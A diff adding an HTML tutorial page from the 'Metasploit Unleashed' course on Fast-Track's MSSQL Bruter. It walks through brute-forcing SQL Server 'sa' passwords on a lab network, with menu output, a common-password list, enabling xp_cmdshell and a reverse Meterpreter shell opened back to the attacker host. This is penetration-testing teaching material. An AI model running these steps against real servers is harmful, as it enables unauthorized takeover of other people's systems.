@@ -1,0 +1,158 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>MSSQL Bruter</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">MSSQL
+Bruter</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">Probably one of my favorite aspects of
+Fast-Track is the MSSQL
+Bruter. It is probably one of the most robust and unique MSSQL bruters
+on the market today. When performing internal penetration tests, you
+often find that MSSQL "sa" passwords are often overlooked. First, a
+brief history behind these "sa" accounts is in order.
+</p>
+<p style="color: rgb(0, 0, 0);"><br>
+The "sa" account is the system administrator account for
+MSSQL and when using "Mixed Mode" or "SQL Authentication", the SQL "sa"
+account automatically gets created. Administrators have to enter a
+password when creating these accounts and often leave these as weak
+passwords.
+</p>
+<p style="color: rgb(0, 0, 0);"><br>
+Fast-Track attacks this weakness and attempts to identify
+SQL servers with weak "sa" accounts. Once these passwords have been
+guessed, Fast-Track will deliver whatever payload you want through an
+advanced hex to binary conversion utilizing windows debug. Let's scan a
+class C address space for SQL servers. One thing to note when going
+through these steps is that you will be prompted if you want to perform
+advanced SQL discovery.
+</p>
+<p style="color: rgb(0, 0, 0);">In order to explain this, you first
+need to understand default
+installations of SQL Servers. When installing SQL Server, by default it
+will install SQL on TCP Port 1433. In SQL Server 2005+, you can specify
+dynamic port allocation which will make the number somewhat random and
+hard to identify. Luckily for us, SQL server also installs port 1434
+UDP which tells us what TCP port the SQL server is running on. When
+performing the advanced identification, Fast-Track will utilize the
+Metasploit auxiliary module to query port 1433 for the ports, otherwise
+Fast-Track will only end up scanning for port 1433. Let's look at the
+SQL Bruter. Note that by specifying the advanced discovery, it takes
+significantly longer than if you specify no.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">Fast-Track Main Menu:<br><br>        1.  Fast-Track Updates<br>        2.  Autopwn Automation<br>        3.  Nmap Scripting Engine<br>        4.  Microsoft SQL Tools<br>        5.  Mass Client-Side Attack<br>        6.  Exploits<br>        7.  Binary to Hex Payload Converter<br>        8.  Payload Generator<br>        9.  Fast-Track Tutorials<br>        10. Fast-Track Changelog<br>        11. Fast-Track Credits<br>        12. Exit Fast-Track<br><br>        Enter the number: 4<br><br><br>    Microsoft SQL Attack Tools<br><br>        1. MSSQL Injector<br>        2. MSSQL Bruter<br>        3. SQLPwnage<br><br>        (q)uit<br><br>        Enter your choice : 2<br><br>    Enter the IP Address and Port Number to Attack.<br><br>        Options: (a)ttempt SQL Ping and Auto Quick Brute Force<br>                 (m)ass scan and dictionary brute<br>                 (s)ingle Target (Attack a Single Target with big dictionary)<br>                 (f)ind SQL Ports (SQL Ping)<br>                 (i) want a command prompt and know which system is vulnerable<br>                 (v)ulnerable system, I want to add a local admin on the box...<br>                 (r)aw SQL commands to the SQL Server<br>                 (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)<br><br>                 (q)uit<br><br>        Enter Option:</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Fast-Track has a great list of
+options so let's take a look at each of them:
+</span>
+<p style="color: rgb(0, 0, 0);"><br>
+</p>
+<dl style="color: rgb(0, 0, 0);">
+  <dd>
+    <ul>
+      <li>Option 'a', 'attempt SQL Ping and Auto Quick Brute
+Force', will attempt to scan a range of IP addresses. This uses the
+same syntax as Nmap and uses a built-in pre-defined dictionary list of
+about fifty passwords.
+      </li>
+    </ul>
+  </dd>
+</dl>
+<dl style="color: rgb(0, 0, 0);">
+  <dd>
+    <ul>
+      <li>Option 'm', 'mass scan and dictionary brute', will scan
+a range of IP addresses and allow you to specify a word list of your
+own. Fast-Track does come with a decent word list located in 'bin/dict'
+though.
+      </li>
+    </ul>
+  </dd>
+</dl>
+<dl style="color: rgb(0, 0, 0);">
+  <dd>
+    <ul>
+      <li>Option 's', 'single Target (Attack a Single Target with
+big dictionary', will allow you to brute force 1 specific IP address
+with a large word list. </li>
+    </ul>
+  </dd>
+</dl>
+<dl style="color: rgb(0, 0, 0);">
+  <dd>
+    <ul>
+      <li>Option 'f', 'find SQL Ports (SQL Ping)', will only look for
+SQL servers and not attack them.
+      </li>
+    </ul>
+  </dd>
+</dl>
+<dl style="color: rgb(0, 0, 0);">
+  <dd>
+    <ul>
+      <li>Option 'i', 'i want a command prompt and know which
+system is vulnerable', will spawn a command prompt for you if you
+already know the "sa" password.
+      </li>
+    </ul>
+  </dd>
+</dl>
+<dl style="color: rgb(0, 0, 0);">
+  <dd>
+    <ul>
+      <li>Option 'v', 'vulnerable system, I want to add a local
+admin on the box...', will add a new administrative user on a box that
+you know to be vulnerable.
+      </li>
+    </ul>
+  </dd>
+</dl>
+<dl style="color: rgb(0, 0, 0);">
+  <dd>
+    <ul>
+      <li>Option 'e', 'enable xp_cmdshell if its disabled (sql2k
+and sql2k5)', is a stored procedure Fast-Track utilizes in order to
+execute underlying system commands. By default, it is disabled in SQL
+Server 2005 and above but Fast-Track can automatically re-enable it if
+it has been disabled. Just a good thing to mention, when attacking the
+remote system with any of the options, Fast-Track will automatically
+attempt to re-enable xp_cmdshell just in case.
+      </li>
+    </ul>
+  </dd>
+</dl>
+<p style="color: rgb(0, 0, 0);">Let's run through the Quick Brute
+Force.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">Enter the IP Address and Port Number to Attack.<br><br>  Options: (a)ttempt SQL Ping and Auto Quick Brute Force<br>           (m)ass scan and dictionary brute<br>           (s)ingle Target (Attack a Single Target with big dictionary)<br>           (f)ind SQL Ports (SQL Ping)<br>           (i) want a command prompt and know which system is vulnerable<br>           (v)ulnerable system, I want to add a local admin on the box...<br>           (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)<br><br>  Enter Option: a<br>Enter username for SQL database (example:sa): sa<br>Configuration file not detected, running default path.<br>Recommend running setup.py install to configure Fast-Track.<br>Setting default directory...<br>Enter the IP Range to scan for SQL Scan (example 192.168.1.1-255): 10.211.55.1/24<br><br>Do you want to perform advanced SQL server identification on non-standard SQL ports? This will use UDP footprinting in order to determine where the SQL servers are at. This could take quite a long time.<br><br>Do you want to perform advanced identification, yes or no: yes<br><br>[-] Launching SQL Ping, this may take a while to footprint.... [-]<br><br>[*] Please wait while we load the module tree...<br>Brute forcing username: sa<br><br>Be patient this could take awhile...<br><br>Brute forcing password of password2 on IP 10.211.55.128:1433<br>Brute forcing password of  on IP 10.211.55.128:1433<br>Brute forcing password of password on IP 10.211.55.128:1433<br><br>SQL Server Compromised: "sa" with password of: "password" on IP 10.211.55.128:1433<br><br>Brute forcing password of sqlserver on IP 10.211.55.128:1433<br>Brute forcing password of sql on IP 10.211.55.128:1433<br>Brute forcing password of password1 on IP 10.211.55.128:1433<br>Brute forcing password of password123 on IP 10.211.55.128:1433<br>Brute forcing password of complexpassword on IP 10.211.55.128:1433<br>Brute forcing password of database on IP 10.211.55.128:1433<br>Brute forcing password of server on IP 10.211.55.128:1433<br>Brute forcing password of changeme on IP 10.211.55.128:1433<br>Brute forcing password of change on IP 10.211.55.128:1433<br>Brute forcing password of sqlserver2000 on IP 10.211.55.128:1433<br>Brute forcing password of sqlserver2005 on IP 10.211.55.128:1433<br>Brute forcing password of Sqlserver on IP 10.211.55.128:1433<br>Brute forcing password of SqlServer on IP 10.211.55.128:1433<br>Brute forcing password of Password1 on IP 10.211.55.128:1433<br><br>Brute forcing password of xp on IP 10.211.55.128:1433<br>Brute forcing password of nt on IP 10.211.55.128:1433<br>Brute forcing password of 98 on IP 10.211.55.128:1433<br>Brute forcing password of 95 on IP 10.211.55.128:1433<br>Brute forcing password of 2003 on IP 10.211.55.128:1433<br>Brute forcing password of 2008 on IP 10.211.55.128:1433<br><br>*******************************************<br>The following SQL Servers were compromised:<br>*******************************************<br><br>1. 10.211.55.128:1433 *** U/N: sa P/W: password ***<br><br>*******************************************<br><br>To interact with system, enter the SQL Server number.<br><br>Example: 1. 192.168.1.32 you would type 1<br><br>Enter the number:</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Looking at the output above, we have
+compromised an SQL server at
+IP address 10.211.55.128 on port 1433 with username "sa" and password
+"password". We now want full access to this bad boy. There are a lot of
+options we can specify and in this case, we'll use a Meterpreter
+console but there are various other options available to you.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">Enter number here: 1<br><br>Enabling: XP_Cmdshell...<br>Finished trying to re-enable xp_cmdshell stored procedure if disabled.<br><br>Configuration file not detected, running default path.<br>Recommend running setup.py install to configure Fast-Track.<br>Setting default directory...<br>What port do you want the payload to connect to you on: 4444<br>Metasploit Reverse Meterpreter Upload Detected..<br>Launching Meterpreter Handler.<br>Creating Metasploit Reverse Meterpreter Payload..<br>Sending payload: c88f3f9ac4bbe0e66da147e0f96efd48dad6<br>Sending payload: ac8cbc47714aaeed2672d69e251cee3dfbad<br>Metasploit payload delivered..<br>Converting our payload to binary, this may take a few...<br>Cleaning up...<br>Launching payload, this could take up to a minute...<br>When finished, close the metasploit handler window to return to other compromised SQL Servers.<br>[*] Please wait while we load the module tree...<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...<br>[*] Transmitting intermediate stager for over-sized stage...(216 bytes)<br>[*] Sending stage (718336 bytes)<br>[*] Meterpreter session 1 opened (10.211.55.130:4444 -&gt; 10.211.55.128:1030)<br><br><u>meterpreter</u> &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Success! We now have full access to
+this machine. Pretty wicked stuff, and all through guessing the SQL
+"sa" account.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Fast-Track"
+ title="Fast-Track">Fast-Track</a></div>
+</body>
+</html>
